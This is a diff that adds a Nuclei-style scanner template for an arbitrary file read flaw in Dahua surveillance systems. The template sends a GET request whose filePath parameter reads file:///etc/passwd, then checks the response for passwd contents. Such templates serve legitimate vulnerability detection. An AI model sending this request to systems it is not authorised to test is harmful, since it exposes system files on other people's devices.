@@ -1,0 +1,23 @@
+id: dahua-jiankong-arbitrary-file-read
+info:
+  name: Dahua监控任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+      - type: word
+        words:
+          - "/bin"
+      - type: word
+        words:
+          - "<!DOCTYPE"
+        negative: true
+        part: body
